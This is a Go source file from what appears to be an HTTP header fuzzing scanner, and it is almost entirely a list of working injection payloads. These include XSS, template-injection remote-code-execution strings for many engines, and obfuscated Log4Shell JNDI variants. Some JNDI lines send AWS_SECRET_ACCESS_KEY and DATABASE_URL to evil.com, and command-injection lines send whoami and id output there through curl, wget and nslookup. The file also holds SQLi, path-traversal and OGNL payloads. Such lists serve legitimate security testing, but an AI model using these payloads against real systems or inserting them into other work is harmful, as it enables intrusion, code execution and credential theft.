package headers

import "github.com/cc1a2b/hhunter/engine"

func GetInjectionMutations() []engine.Mutation {
	return []engine.Mutation{
		// ===================================================================
		// XSS — Reflected via Header Values
		// ===================================================================
		{Header: "X-Custom-Header", Value: `<script>alert(1)</script>`, Category: "Injection", Impact: "Reflected XSS via Header"},
		{Header: "X-Custom-Header", Value: `'"><img src=x onerror=alert(1)>`, Category: "Injection", Impact: "Reflected XSS img onerror"},
		{Header: "X-Custom-Header", Value: `"><svg/onload=alert(1)>`, Category: "Injection", Impact: "Reflected XSS svg onload"},
		{Header: "X-Custom-Header", Value: `javascript:alert(1)//`, Category: "Injection", Impact: "JavaScript Protocol XSS"},
		{Header: "X-Custom-Header", Value: `<details open ontoggle=alert(1)>`, Category: "Injection", Impact: "HTML5 Details XSS"},
		{Header: "X-Custom-Header", Value: `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`, Category: "Injection", Impact: "Math Tag Mutation XSS"},
		{Header: "X-Custom-Header", Value: `<img src=x onerror=import('//evil.com/xss.js')>`, Category: "Injection", Impact: "Dynamic Import XSS"},

		// Referer-based XSS
		{Header: "Referer", Value: `https://evil.com/<script>alert(1)</script>`, Category: "Injection", Impact: "XSS via Referer"},
		{Header: "Referer", Value: `javascript:alert(1)`, Category: "Injection", Impact: "JavaScript Protocol in Referer"},

		// User-Agent XSS
		{Header: "User-Agent", Value: `<script>alert(1)</script>`, Category: "Injection", Impact: "XSS via User-Agent"},
		{Header: "User-Agent", Value: `"><svg/onload=alert(document.domain)>`, Category: "Injection", Impact: "XSS via User-Agent SVG"},

		// ===================================================================
		// Server-Side Template Injection (SSTI) — Multi-Engine
		// ===================================================================
		// Generic probes
		{Header: "X-Custom-Header", Value: "{{7*7}}", Category: "Injection", Impact: "SSTI Generic Jinja2/Twig Probe"},
		{Header: "X-Custom-Header", Value: "${7*7}", Category: "Injection", Impact: "SSTI Expression Language Probe"},
		{Header: "X-Custom-Header", Value: "#{7*7}", Category: "Injection", Impact: "SSTI Ruby/Spring EL Probe"},
		{Header: "X-Custom-Header", Value: "<%= 7*7 %>", Category: "Injection", Impact: "SSTI ERB Template Probe"},
		{Header: "X-Custom-Header", Value: "{{7*'7'}}", Category: "Injection", Impact: "SSTI Jinja2 vs Twig Differentiator"},
		{Header: "X-Custom-Header", Value: "${7*7}", Category: "Injection", Impact: "SSTI Freemarker/Velocity Probe"},
		{Header: "X-Custom-Header", Value: "[#assign x=7*7]${x}", Category: "Injection", Impact: "SSTI Freemarker Assign"},
		{Header: "X-Custom-Header", Value: "#set($x=7*7)$x", Category: "Injection", Impact: "SSTI Velocity Assign"},

		// Jinja2 RCE (Python)
		{Header: "X-Custom-Header", Value: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", Category: "Injection", Impact: "SSTI Jinja2 RCE via config"},
		{Header: "X-Custom-Header", Value: "{{request.__class__.__mro__[2].__subclasses__()}}", Category: "Injection", Impact: "SSTI Jinja2 Class Traversal"},
		{Header: "X-Custom-Header", Value: "{{cycler.__init__.__globals__.os.popen('id').read()}}", Category: "Injection", Impact: "SSTI Jinja2 RCE via cycler"},
		{Header: "X-Custom-Header", Value: "{{lipsum.__globals__['os'].popen('id').read()}}", Category: "Injection", Impact: "SSTI Jinja2 RCE via lipsum"},

		// Twig RCE (PHP)
		{Header: "X-Custom-Header", Value: "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}", Category: "Injection", Impact: "SSTI Twig RCE via registerCallback"},
		{Header: "X-Custom-Header", Value: "{{['id']|filter('system')}}", Category: "Injection", Impact: "SSTI Twig RCE via filter"},

		// Thymeleaf RCE (Java/Spring)
		{Header: "X-Custom-Header", Value: "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x", Category: "Injection", Impact: "SSTI Thymeleaf RCE SpEL"},
		{Header: "X-Custom-Header", Value: "${T(java.lang.Runtime).getRuntime().exec('id')}", Category: "Injection", Impact: "SSTI Spring Expression Language RCE"},
		{Header: "X-Custom-Header", Value: "*{T(java.lang.Runtime).getRuntime().exec('id')}", Category: "Injection", Impact: "SSTI Thymeleaf Star Syntax RCE"},

		// Freemarker RCE (Java)
		{Header: "X-Custom-Header", Value: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`, Category: "Injection", Impact: "SSTI Freemarker Execute RCE"},
		{Header: "X-Custom-Header", Value: `${"freemarker.template.utility.Execute"?new()("id")}`, Category: "Injection", Impact: "SSTI Freemarker Inline RCE"},

		// Velocity RCE (Java)
		{Header: "X-Custom-Header", Value: `#set($e="")#set($rt=$e.class.forName("java.lang.Runtime"))#set($chr=$e.class.forName("java.lang.Character"))#set($str=$e.class.forName("java.lang.String"))`, Category: "Injection", Impact: "SSTI Velocity Class Forging"},

		// Pebble RCE (Java)
		{Header: "X-Custom-Header", Value: `{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}`, Category: "Injection", Impact: "SSTI Pebble RCE"},

		// Groovy RCE
		{Header: "X-Custom-Header", Value: `${"".class.forName("java.lang.Runtime").methods[6].invoke("".class.forName("java.lang.Runtime")).exec("id")}`, Category: "Injection", Impact: "SSTI Groovy RCE"},

		// Blade (Laravel)
		{Header: "X-Custom-Header", Value: `@php system('id'); @endphp`, Category: "Injection", Impact: "SSTI Blade PHP System"},

		// Handlebars
		{Header: "X-Custom-Header", Value: `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}`, Category: "Injection", Impact: "SSTI Handlebars Prototype RCE"},

		// SSTI via common logged headers
		{Header: "Referer", Value: "https://evil.com/{{7*7}}", Category: "Injection", Impact: "SSTI via Referer"},
		{Header: "User-Agent", Value: "{{7*7}}", Category: "Injection", Impact: "SSTI via User-Agent"},
		{Header: "X-Forwarded-For", Value: "{{7*7}}", Category: "Injection", Impact: "SSTI via XFF"},
		{Header: "Accept-Language", Value: "{{7*7}}", Category: "Injection", Impact: "SSTI via Accept-Language"},

		// ===================================================================
		// Prototype Pollution via Headers (Node.js)
		// ===================================================================
		{Header: "X-Custom-Header", Value: "{{constructor.constructor('return this')()}}", Category: "Injection", Impact: "Prototype Pollution via Header"},
		{Header: "Content-Type", Value: "application/json;__proto__[polluted]=true", Category: "Injection", Impact: "Prototype Pollution Content-Type"},
		{Header: "X-Custom-Header", Value: `{"__proto__":{"polluted":true}}`, Category: "Injection", Impact: "Prototype Pollution JSON via Header"},
		{Header: "X-Custom-Header", Value: `{"constructor":{"prototype":{"polluted":true}}}`, Category: "Injection", Impact: "Prototype Pollution Constructor"},

		// ===================================================================
		// Host Header Injection
		// ===================================================================
		{Header: "Host", Value: "evil.com", Category: "Injection", Impact: "Host Header Injection"},
		{Header: "Host", Value: "localhost", Category: "Injection", Impact: "Host Header Localhost"},
		{Header: "Host", Value: "127.0.0.1", Category: "Injection", Impact: "Host Header Loopback"},
		{Header: "Host", Value: "evil.com:443", Category: "Injection", Impact: "Host Header Port Injection"},
		{Header: "Host", Value: "[::1]", Category: "Injection", Impact: "Host Header IPv6 Loopback"},
		{Header: "Host", Value: "evil.com#@legitimate.com", Category: "Injection", Impact: "Host Header Fragment Bypass"},
		{Header: "Host", Value: "legitimate.com@evil.com", Category: "Injection", Impact: "Host Header Userinfo Bypass"},
		{Header: "Host", Value: "evil.com\r\nX-Injected: true", Category: "Injection", Impact: "Host Header CRLF Injection"},
		{Header: "Host", Value: "evil.com%00.legitimate.com", Category: "Injection", Impact: "Host Header Null Byte"},

		// ===================================================================
		// Log4Shell / JNDI — Comprehensive bypass variants
		// ===================================================================
		// Basic protocols
		{Header: "X-Api-Version", Value: "${jndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell LDAP via Header"},
		{Header: "X-Forwarded-For", Value: "${jndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell via XFF"},
		{Header: "Accept-Language", Value: "${jndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell via Accept-Language"},
		{Header: "X-Request-Id", Value: "${jndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell via Request-ID"},
		{Header: "X-Correlation-Id", Value: "${jndi:dns://evil.com/a}", Category: "Injection", Impact: "Log4Shell DNS via Correlation-ID"},
		{Header: "Authorization", Value: "Bearer ${jndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell via Auth Header"},
		{Header: "User-Agent", Value: "${jndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell via User-Agent"},

		// Protocol variants
		{Header: "X-Custom-Header", Value: "${jndi:rmi://evil.com/a}", Category: "Injection", Impact: "Log4Shell RMI Protocol"},
		{Header: "X-Custom-Header", Value: "${jndi:ldaps://evil.com/a}", Category: "Injection", Impact: "Log4Shell LDAPS Protocol"},
		{Header: "X-Custom-Header", Value: "${jndi:dns://evil.com/a}", Category: "Injection", Impact: "Log4Shell DNS Protocol"},
		{Header: "X-Custom-Header", Value: "${jndi:iiop://evil.com/a}", Category: "Injection", Impact: "Log4Shell IIOP Protocol"},
		{Header: "X-Custom-Header", Value: "${jndi:corba://evil.com/a}", Category: "Injection", Impact: "Log4Shell CORBA Protocol"},
		{Header: "X-Custom-Header", Value: "${jndi:nds://evil.com/a}", Category: "Injection", Impact: "Log4Shell NDS Protocol"},

		// WAF bypass obfuscation
		{Header: "X-Custom-Header", Value: "${${lower:j}ndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell lower Bypass"},
		{Header: "X-Custom-Header", Value: "${j${::-n}di:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell Nested Default Bypass"},
		{Header: "X-Custom-Header", Value: "${${upper:j}ndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell upper Bypass"},
		{Header: "X-Custom-Header", Value: "${j${upper:N}di:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell Mixed Case Bypass"},
		{Header: "X-Custom-Header", Value: "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell Full Lower Bypass"},
		{Header: "X-Custom-Header", Value: "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell Full Default Bypass"},
		{Header: "X-Custom-Header", Value: "${j${::-n}d${::-i}:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell Partial Default Bypass"},
		{Header: "X-Custom-Header", Value: "${${env:NaN:-j}ndi${env:NaN:-:}ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell Env Default Bypass"},
		{Header: "X-Custom-Header", Value: "${jn${lower:d}i:l${lower:d}ap://evil.com/a}", Category: "Injection", Impact: "Log4Shell Nested Lower Bypass"},

		// Log4Shell environment variable exfiltration
		{Header: "X-Custom-Header", Value: "${jndi:ldap://evil.com/${env:AWS_SECRET_ACCESS_KEY}}", Category: "Injection", Impact: "Log4Shell AWS Key Exfil"},
		{Header: "X-Custom-Header", Value: "${jndi:ldap://evil.com/${env:DATABASE_URL}}", Category: "Injection", Impact: "Log4Shell DB URL Exfil"},
		{Header: "X-Custom-Header", Value: "${jndi:ldap://evil.com/${sys:java.version}}", Category: "Injection", Impact: "Log4Shell Java Version Exfil"},
		{Header: "X-Custom-Header", Value: "${jndi:ldap://evil.com/${sys:os.name}}", Category: "Injection", Impact: "Log4Shell OS Name Exfil"},
		{Header: "X-Custom-Header", Value: "${jndi:ldap://evil.com/${env:PATH}}", Category: "Injection", Impact: "Log4Shell PATH Exfil"},
		{Header: "X-Custom-Header", Value: "${jndi:ldap://evil.com/${hostName}}", Category: "Injection", Impact: "Log4Shell Hostname Exfil"},

		// Log4Shell via every common logged header
		{Header: "Cookie", Value: "${jndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell via Cookie"},
		{Header: "X-Forwarded-Host", Value: "${jndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell via X-Forwarded-Host"},
		{Header: "Origin", Value: "${jndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell via Origin"},
		{Header: "Referer", Value: "${jndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell via Referer"},
		{Header: "If-Modified-Since", Value: "${jndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell via If-Modified-Since"},
		{Header: "X-Wap-Profile", Value: "${jndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell via X-Wap-Profile"},
		{Header: "Contact", Value: "${jndi:ldap://evil.com/a}", Category: "Injection", Impact: "Log4Shell via Contact"},

		// ===================================================================
		// SQLi via Headers — Blind Time-based
		// ===================================================================
		// Generic SQLi probes
		{Header: "Referer", Value: "https://evil.com/' OR '1'='1", Category: "Injection", Impact: "SQLi via Referer"},
		{Header: "User-Agent", Value: "' OR '1'='1' --", Category: "Injection", Impact: "SQLi via User-Agent"},

		// MySQL time-based blind
		{Header: "User-Agent", Value: "' AND SLEEP(5)-- -", Category: "Injection", Impact: "Blind SQLi MySQL SLEEP via UA"},
		{Header: "X-Forwarded-For", Value: "' AND SLEEP(5)-- -", Category: "Injection", Impact: "Blind SQLi MySQL SLEEP via XFF"},
		{Header: "Referer", Value: "https://evil.com/' AND SLEEP(5)-- -", Category: "Injection", Impact: "Blind SQLi MySQL SLEEP via Referer"},
		{Header: "User-Agent", Value: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", Category: "Injection", Impact: "Blind SQLi MySQL Subquery SLEEP"},
		{Header: "User-Agent", Value: "' AND BENCHMARK(10000000,SHA1('test'))-- -", Category: "Injection", Impact: "Blind SQLi MySQL BENCHMARK"},

		// PostgreSQL time-based blind
		{Header: "User-Agent", Value: "'; SELECT pg_sleep(5);--", Category: "Injection", Impact: "Blind SQLi PostgreSQL pg_sleep"},
		{Header: "X-Forwarded-For", Value: "' AND (SELECT pg_sleep(5))::text='1", Category: "Injection", Impact: "Blind SQLi PostgreSQL pg_sleep via XFF"},
		{Header: "User-Agent", Value: "' AND CAST(pg_sleep(5) AS TEXT) IS NOT NULL-- -", Category: "Injection", Impact: "Blind SQLi PostgreSQL CAST pg_sleep"},

		// MSSQL time-based blind
		{Header: "User-Agent", Value: "'; WAITFOR DELAY '0:0:5';--", Category: "Injection", Impact: "Blind SQLi MSSQL WAITFOR"},
		{Header: "X-Forwarded-For", Value: "'; WAITFOR DELAY '0:0:5';--", Category: "Injection", Impact: "Blind SQLi MSSQL WAITFOR via XFF"},
		{Header: "User-Agent", Value: "' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)--", Category: "Injection", Impact: "Blind SQLi MSSQL Conditional"},

		// Oracle time-based blind
		{Header: "User-Agent", Value: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", Category: "Injection", Impact: "Blind SQLi Oracle DBMS_PIPE"},
		{Header: "User-Agent", Value: "' AND UTL_INADDR.GET_HOST_ADDRESS('sleep5.evil.com') IS NOT NULL--", Category: "Injection", Impact: "Blind SQLi Oracle UTL_INADDR"},

		// SQLite time-based
		{Header: "User-Agent", Value: "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", Category: "Injection", Impact: "Blind SQLi SQLite Heavy Query"},

		// Error-based SQLi probes
		{Header: "User-Agent", Value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -", Category: "Injection", Impact: "Error SQLi MySQL EXTRACTVALUE"},
		{Header: "User-Agent", Value: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)-- -", Category: "Injection", Impact: "Error SQLi MySQL Double Query"},
		{Header: "User-Agent", Value: "' AND 1=CONVERT(int,(SELECT @@version))--", Category: "Injection", Impact: "Error SQLi MSSQL CONVERT"},

		// ===================================================================
		// XXE / XML via Headers
		// ===================================================================
		{Header: "Content-Type", Value: "application/xml", Category: "Injection", Impact: "XML Content-Type Injection"},
		{Header: "Accept", Value: "application/xml", Category: "Injection", Impact: "XML Accept Injection"},
		{Header: "Content-Type", Value: "text/xml; charset=utf-8", Category: "Injection", Impact: "XML Content-Type UTF-8"},
		{Header: "SOAPAction", Value: "urn:test", Category: "Injection", Impact: "SOAP Action Injection"},
		{Header: "Content-Type", Value: "application/xhtml+xml", Category: "Injection", Impact: "XHTML Content-Type XXE Vector"},

		// ===================================================================
		// Command Injection via Headers
		// ===================================================================
		{Header: "X-Custom-Header", Value: "; id", Category: "Injection", Impact: "Command Injection Semicolon"},
		{Header: "X-Custom-Header", Value: "| id", Category: "Injection", Impact: "Pipe Command Injection"},
		{Header: "X-Custom-Header", Value: "`id`", Category: "Injection", Impact: "Backtick Command Injection"},
		{Header: "X-Custom-Header", Value: "$(id)", Category: "Injection", Impact: "Subshell Command Injection"},
		{Header: "X-Custom-Header", Value: "|| id", Category: "Injection", Impact: "OR Command Injection"},
		{Header: "X-Custom-Header", Value: "&& id", Category: "Injection", Impact: "AND Command Injection"},
		{Header: "X-Custom-Header", Value: "; cat /etc/passwd", Category: "Injection", Impact: "Command Injection /etc/passwd"},
		{Header: "X-Custom-Header", Value: "| curl http://evil.com/$(whoami)", Category: "Injection", Impact: "Command Injection OOB curl"},
		{Header: "X-Custom-Header", Value: "| wget http://evil.com/$(id|base64)", Category: "Injection", Impact: "Command Injection OOB wget"},
		{Header: "X-Custom-Header", Value: "| nslookup $(whoami).evil.com", Category: "Injection", Impact: "Command Injection DNS Exfil"},
		{Header: "X-Custom-Header", Value: "${IFS}id", Category: "Injection", Impact: "Command Injection IFS Bypass"},
		{Header: "X-Custom-Header", Value: ";$IFS`id`", Category: "Injection", Impact: "Command Injection IFS Backtick"},

		// ===================================================================
		// Path Traversal via Headers
		// ===================================================================
		{Header: "X-Original-URL", Value: "/../../../etc/passwd", Category: "Injection", Impact: "Path Traversal via URL Override"},
		{Header: "X-Rewrite-URL", Value: "/..%2f..%2f..%2fetc/passwd", Category: "Injection", Impact: "Encoded Path Traversal"},
		{Header: "X-Original-URL", Value: "/....//....//....//etc/passwd", Category: "Injection", Impact: "Double Dot Path Traversal"},
		{Header: "X-Original-URL", Value: "/%2e%2e/%2e%2e/%2e%2e/etc/passwd", Category: "Injection", Impact: "URL Encoded Dot Traversal"},
		{Header: "X-Original-URL", Value: "/..%252f..%252f..%252fetc/passwd", Category: "Injection", Impact: "Double Encoded Path Traversal"},
		{Header: "X-Original-URL", Value: "/..%c0%af..%c0%af..%c0%afetc/passwd", Category: "Injection", Impact: "UTF-8 Overlong Path Traversal"},
		{Header: "X-Original-URL", Value: "/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", Category: "Injection", Impact: "Unicode Fullwidth Slash Traversal"},
		{Header: "User-Agent", Value: "../../../../../etc/passwd", Category: "Injection", Impact: "Path Traversal via User-Agent"},

		// ===================================================================
		// Null Byte Injection
		// ===================================================================
		{Header: "X-Custom-Header", Value: "test\x00admin", Category: "Injection", Impact: "Null Byte Injection"},
		{Header: "X-Filename", Value: "../../etc/passwd%00.jpg", Category: "Injection", Impact: "Null Byte File Inclusion"},

		// ===================================================================
		// Unicode Normalization Attacks
		// ===================================================================
		{Header: "X-Custom-Header", Value: "\uff41\uff44\uff4d\uff49\uff4e", Category: "Injection", Impact: "Unicode Fullwidth admin"},
		{Header: "X-Custom-Header", Value: "admin\u200b", Category: "Injection", Impact: "Zero Width Space Injection"},
		{Header: "X-Custom-Header", Value: "adm\u0131n", Category: "Injection", Impact: "Unicode Dotless I Bypass"},

		// ===================================================================
		// GraphQL Injection via Headers
		// ===================================================================
		{Header: "X-Custom-Header", Value: `{"query":"{ __schema { types { name } } }"}`, Category: "Injection", Impact: "GraphQL Introspection via Header"},
		{Header: "X-Custom-Header", Value: `{"query":"{ __type(name:\"User\") { fields { name } } }"}`, Category: "Injection", Impact: "GraphQL Type Discovery"},

		// ===================================================================
		// NoSQL Injection via Headers
		// ===================================================================
		{Header: "X-Custom-Header", Value: `{"$gt":""}`, Category: "Injection", Impact: "NoSQL Injection gt Operator"},
		{Header: "X-Custom-Header", Value: `{"$ne":"invalid"}`, Category: "Injection", Impact: "NoSQL Injection ne Operator"},
		{Header: "X-Custom-Header", Value: `{"$regex":".*"}`, Category: "Injection", Impact: "NoSQL Injection regex Operator"},
		{Header: "User-Agent", Value: "true, $where: '1 == 1'", Category: "Injection", Impact: "NoSQL Injection $where"},

		// ===================================================================
		// LDAP Injection via Headers
		// ===================================================================
		{Header: "X-Custom-Header", Value: "*)(objectClass=*", Category: "Injection", Impact: "LDAP Injection Wildcard"},
		{Header: "X-Custom-Header", Value: "admin)(&)", Category: "Injection", Impact: "LDAP Injection AND Close"},
		{Header: "X-Custom-Header", Value: "x)(|(uid=*))", Category: "Injection", Impact: "LDAP Injection OR All"},

		// ===================================================================
		// Expression Language Injection (Java EL, Spring EL, OGNL)
		// ===================================================================
		{Header: "X-Custom-Header", Value: "${applicationScope}", Category: "Injection", Impact: "Java EL Application Scope Leak"},
		{Header: "X-Custom-Header", Value: "%{(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}", Category: "Injection", Impact: "OGNL RCE via Header"},
		{Header: "X-Custom-Header", Value: "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'id'})).redirectErrorStream(true).start()}", Category: "Injection", Impact: "OGNL ProcessBuilder RCE"},
	}
}
